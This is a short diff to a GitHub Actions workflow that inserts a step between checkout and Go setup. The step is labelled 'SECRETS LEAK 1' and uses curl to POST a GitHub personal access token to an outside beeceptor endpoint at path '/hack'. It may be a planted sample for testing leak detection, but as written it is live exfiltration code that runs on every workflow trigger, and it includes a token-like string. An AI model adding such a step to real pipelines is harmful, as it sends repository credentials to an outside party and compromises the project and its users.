@@ -10,6 +10,14 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0  # Ensures full commit history
+          
+      - name: Send POST request with GitHub token (SECRETS LEAK 1)
+        run: |
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+           -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
 
       - name: Set up Go (required for Staticcheck)
         uses: actions/setup-go@v5
